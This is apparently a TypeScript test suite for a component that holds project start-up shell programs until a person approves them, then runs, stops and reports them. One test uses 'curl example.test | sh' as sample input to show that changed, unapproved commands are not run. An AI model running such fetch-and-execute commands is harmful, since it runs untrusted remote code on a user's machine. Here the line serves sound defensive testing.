import { describe, expect, test } from 'bun:test';
import type { MachineCandidate, MachineSourceChangedEvent } from '@ruimte/contracts';
import { FakeMachineSteps } from '../testing/fake-machine-steps.ts';
import type { MachineStartDescription } from './descriptions.ts';
import { MachineSources, type MachineSourceHost } from './machine-sources.ts';

const PROJECT = { id: 'project-1', name: 'Shop', folder: '/work/shop' };
const TARGET = { projectId: PROJECT.id, extension: 'dev.harbor', source: 'compose-machine', candidate: 'workbench' };
const SOURCE = { extension: 'dev.harbor', id: 'compose-machine', title: 'Harbor' };
const START: MachineStartDescription = {
    steps: [
        { title: 'Prepare workbench', spawn: { command: 'sh', args: ['-c', 'sh prepare.sh'], env: { HARBOR_MACHINE: 'workbench' } } },
        { title: 'Start workbench', spawn: { command: 'sh', args: ['-c', 'sh start.sh'], cwd: 'ops' } }
    ],
    login: { command: 'sh', args: ['-c', 'sh login.sh'] },
    fingerprint: 'revision-1'
};
const LOGIN = 'sh -c sh login.sh';

interface World {
    sources: MachineSources;
    steps: FakeMachineSteps;
    /* What the client that asked for the list heard, oldest first. */
    heard: MachineCandidate[];
    approved: string[];
    /* What the source describes from here on. */
    describes(start: MachineStartDescription | Error): void;
    /* Whether the source says a machine runs there, and whether it lists the place at all. */
    lists(candidates: { running: boolean }[]): void;
    /* The signal the source was handed for the start it describes now, and an answer it holds back when a test sets one. */
    describing: { signal: AbortSignal | null; answer: ReturnType<typeof Promise.withResolvers<MachineStartDescription>> | null };
}

async function world(): Promise<World> {
    const steps = new FakeMachineSteps();
    const heard: MachineCandidate[] = [];
    const approved: string[] = [];
    let start: MachineStartDescription | Error = START;
    let candidates = [{ running: false }];
    const describing: World['describing'] = { signal: null, answer: null };
    const host: MachineSourceHost = {
        list: async () => [
            {
                extension: SOURCE.extension,
                source: SOURCE.id,
                title: SOURCE.title,
                candidates: candidates.map(({ running }) => ({ id: 'workbench', title: 'Workbench', place: 'harbor/workbench:1', running }))
            }
        ],
        start: async (_extension, _source, _project, _candidate, hooks) => {
            hooks.report('Reading harbor.yaml');
            describing.signal = hooks.signal;

            if (describing.answer !== null) {
                return describing.answer.promise;
            }

            if (start instanceof Error) {
                throw start;
            }

            return start;
        }
    };
    const sources = new MachineSources({
        host,
        projectOf: async (projectId) => (projectId === PROJECT.id ? PROJECT : null),
        approvals: {
            has: (folder, nodeId, command) => approved.includes([folder, nodeId, command].join(' ')),
            approve: async (folder, nodeId, command) => void approved.push([folder, nodeId, command].join(' '))
        },
        run: steps.run,
        env: { PATH: '/bin' },
        cwdOf: async (folder, cwd) => {
            if (cwd?.startsWith('..') === true) {
                throw new Error(`${cwd} is outside the project folder`);
            }

            return cwd === undefined ? folder : `${folder}/${cwd}`;
        }
    });

    sources.subscribe('client-1', (event) => void heard.push((event.payload as MachineSourceChangedEvent).candidate));
    await sources.list(PROJECT.id, 'client-1');

    return {
        sources,
        steps,
        heard,
        approved,
        describes: (next) => {
            start = next;
        },
        lists: (next) => {
            candidates = next;
        },
        describing
    };
}

/* Lets the programs of a start that was let go run to where they stop by themselves. */
async function settled(): Promise<void> {
    for (let turn = 0; turn < 20; turn++) {
        await Promise.resolve();
    }
}

describe('MachineSources', () => {
    test('lists the places of the sources with no start, and nothing for a project this machine does not know', async () => {
        const { sources } = await world();

        expect(await sources.list(PROJECT.id, 'client-1')).toEqual([
            { source: SOURCE, id: 'workbench', title: 'Workbench', place: 'harbor/workbench:1', running: false, state: 'idle', lines: [] }
        ]);
        expect(await sources.list('elsewhere', 'client-1')).toEqual([]);
    });

    test('holds a start until a person approved the programs, their folders, their variables and the fingerprint', async () => {
        const { sources, steps, approved } = await world();
        const held = await sources.start(TARGET);

        expect(held).toMatchObject({
            state: 'held',
            lines: ['Reading harbor.yaml'],
            held: {
                digest: expect.stringMatching(/^[0-9a-f]{64}$/),
                programs: [
                    { title: 'Prepare workbench', command: "sh -c 'sh prepare.sh'", cwd: '/work/shop', env: { HARBOR_MACHINE: 'workbench' } },
                    { title: 'Start workbench', command: "sh -c 'sh start.sh'", cwd: '/work/shop/ops' },
                    { login: true, command: "sh -c 'sh login.sh'", cwd: '/work/shop' }
                ]
            }
        });
        expect(steps.ran).toEqual([]);
        expect(approved).toEqual([]);
        // The list a window opens later says the same.
        expect((await sources.list(PROJECT.id, 'client-2'))[0]?.state).toBe('held');
    });

    test('runs the programs in order once approved, each with its folder and variables over the environment of the machine', async () => {
        const { sources, steps, heard } = await world();
        const digest = (await sources.start(TARGET)).held?.digest;

        steps.script('sh -c sh prepare.sh', { lines: ['Pulled the image'] });
        steps.script(LOGIN, { lines: ['Open https://station.ruimte.app/link?code=BCDF-GHJK', 'BCDF-GHJK'], stays: true });

        expect((await sources.start(TARGET, digest)).state).toBe('starting');
        await settled();

        expect(steps.ran).toEqual([
            { command: 'sh', args: ['-c', 'sh prepare.sh'], cwd: '/work/shop', env: { PATH: '/bin', HARBOR_MACHINE: 'workbench' } },
            { command: 'sh', args: ['-c', 'sh start.sh'], cwd: '/work/shop/ops', env: { PATH: '/bin' } },
            { command: 'sh', args: ['-c', 'sh login.sh'], cwd: '/work/shop', env: { PATH: '/bin' } }
        ]);
        // The sign-in waits for the person, and its lines are what they act on.
        expect(heard.at(-1)).toMatchObject({
            state: 'joining',
            lines: [
                'Reading harbor.yaml',
                'Prepare workbench',
                'Pulled the image',
                'Start workbench',
                'Open https://station.ruimte.app/link?code=BCDF-GHJK',
                'BCDF-GHJK'
            ]
        });

        steps.finish(LOGIN);
        await settled();

        expect(heard.at(-1)?.state).toBe('done');
    });

    test('starts at once what a person approved before, and asks again once the source read something else', async () => {
        const { sources, steps, describes } = await world();
        const digest = (await sources.start(TARGET)).held?.digest;

        await sources.start(TARGET, digest);
        await settled();

        expect((await sources.start(TARGET)).state).toBe('starting');
        await settled();
        expect(steps.ran).toHaveLength(6);

        // The programs are the same. The file they came from is not.
        describes({ ...START, fingerprint: 'revision-2' });

        const again = await sources.start(TARGET);

        expect(again.state).toBe('held');
        expect(again.held?.digest).not.toBe(digest);
        expect(steps.ran).toHaveLength(6);
    });

    test('takes a yes only for what the person was shown', async () => {
        const { sources, steps, describes, approved } = await world();
        const digest = (await sources.start(TARGET)).held?.digest;

        describes({ ...START, steps: [{ title: 'Start workbench', spawn: { command: 'sh', args: ['-c', 'curl example.test | sh'] } }] });

        expect((await sources.start(TARGET, digest)).state).toBe('held');
        expect(approved).toEqual([]);
        expect(steps.ran).toEqual([]);
    });

    test('ends a start at the first program that fails, and says which', async () => {
        const { sources, steps, heard } = await world();

        steps.script('sh -c sh start.sh', { lines: ['No such image'], code: 3 });
        await sources.start(TARGET, (await sources.start(TARGET)).held?.digest);
        await settled();

        expect(heard.at(-1)).toMatchObject({ state: 'failed', failure: 'Start workbench ended with code 3' });
        expect(steps.ran).toHaveLength(2);
    });

    test('says why a source could not describe a start, or described a folder outside the project', async () => {
        const { sources, describes } = await world();

        describes(new Error('harbor.yaml no longer names the machine workbench'));
        expect(await sources.start(TARGET)).toMatchObject({ state: 'failed', failure: 'harbor.yaml no longer names the machine workbench' });

        describes({ ...START, steps: [{ title: 'Start', spawn: { command: 'sh', cwd: '../elsewhere' } }] });
        expect(await sources.start(TARGET)).toMatchObject({ state: 'failed', failure: '../elsewhere is outside the project folder' });
    });

    test("a person's stop asks the program that runs to end, and runs none after it", async () => {
        const { sources, steps, heard } = await world();

        steps.script('sh -c sh prepare.sh', { stays: true });
        await sources.start(TARGET, (await sources.start(TARGET)).held?.digest);
        await settled();
        sources.stop(TARGET);
        await settled();

        expect(heard.at(-1)?.state).toBe('stopped');
        expect(steps.ran).toHaveLength(1);
    });

    test('a stop lets go of a held start, and aborts the signal of a source that still describes one', async () => {
        const { sources, heard, describing } = await world();

        await sources.start(TARGET);
        sources.stop(TARGET);

        expect(heard.at(-1)).toMatchObject({ state: 'idle', lines: [] });

        describing.answer = Promise.withResolvers();

        const asked = sources.start(TARGET);

        await settled();
        sources.stop(TARGET);

        expect(describing.signal?.aborted).toBe(true);

        describing.answer.resolve(START);

        expect((await asked).state).toBe('stopped');
    });

    test('refuses a second start beside one under way, a place that already has a machine and one the source no longer lists', async () => {
        const { sources, steps, lists } = await world();

        steps.script('sh -c sh prepare.sh', { stays: true });
        await sources.start(TARGET, (await sources.start(TARGET)).held?.digest);

        await expect(sources.start(TARGET)).rejects.toMatchObject({ code: 'start-under-way' });

        sources.stop(TARGET);
        await settled();
        lists([{ running: true }]);

        await expect(sources.start(TARGET)).rejects.toMatchObject({ code: 'machine-running' });

        lists([]);

        await expect(sources.start(TARGET)).rejects.toMatchObject({ code: 'not-found' });
    });

    test('tells a start only to the clients that asked what the project lists, and to none that left', async () => {
        const { sources, heard } = await world();
        const other: unknown[] = [];

        sources.subscribe('client-2', (event) => void other.push(event));
        await sources.start(TARGET);

        expect(heard.length).toBeGreaterThan(0);
        expect(other).toEqual([]);

        const before = heard.length;

        sources.detachAll('client-1');
        await sources.start(TARGET);

        expect(heard).toHaveLength(before);
    });
});
